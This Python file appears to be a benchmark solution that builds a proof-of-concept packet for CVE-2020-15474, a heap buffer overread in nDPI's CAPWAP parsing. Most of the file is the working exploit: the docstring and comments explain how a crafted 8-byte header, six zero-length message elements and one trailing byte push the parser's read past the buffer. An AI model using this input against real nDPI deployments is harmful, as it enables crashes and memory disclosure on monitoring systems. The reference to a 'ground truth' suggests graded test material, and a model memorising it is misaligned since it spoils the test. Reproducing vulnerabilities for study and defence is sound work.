import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the CVE-2020-15474 vulnerability in nDPI.

        The vulnerability is a heap buffer overread in the `ndpi_search_setup_capwap`
        function when parsing CAPWAP control message elements. The loop iterating
        through message elements doesn't properly check boundaries, allowing a read
        past the end of the payload buffer.

        This PoC constructs a CAPWAP packet with a specifically sized payload that
        causes the loop's read offset to align just before the end of the buffer.
        The subsequent attempt to read a 2-byte message element type results in an
        out-of-bounds read.

        The PoC consists of:
        1. An 8-byte CAPWAP header.
        2. A 25-byte payload.

        The payload is crafted to have a length of `4*k + 1`. It contains `k`
        4-byte message elements (with 0 length), followed by a single byte.
        After parsing `k` elements, the offset is `4*k`. The loop continues as
        `4*k < 4*k + 1`, and the read at offset `4*k` goes out of bounds.

        For this PoC, k=6.
        - Header: 8 bytes
        - Payload: 6 * (4-byte ME) + 1 byte = 25 bytes
        - Total length: 8 + 25 = 33 bytes, matching the ground truth.
        """

        # 8-byte CAPWAP header.
        # - Version: 0, Type: 0
        # - HLEN: 2 (meaning 2 * 4 = 8 bytes)
        # - The rest is zeroed out, satisfying the (incorrect) T-flag check
        #   in the vulnerable code, which checks `(payload[2] & 0x08) == 0`.
        header = b'\x00\x10\x00\x00\x00\x00\x00\x00'

        # 25-byte payload.
        # This consists of 6 message elements, each with type=0 and length=0.
        # Each ME is 4 bytes. Total 24 bytes.
        message_elements = b'\x00\x00\x00\x00' * 6
        
        # A single trailing byte to make the payload length 25.
        # The loop will attempt to read a 2-byte ME type starting at offset 24
        # in a 25-byte buffer, causing a 1-byte overread.
        trailer = b'\x01'
        
        poc = header + message_elements + trailer
        
        return poc
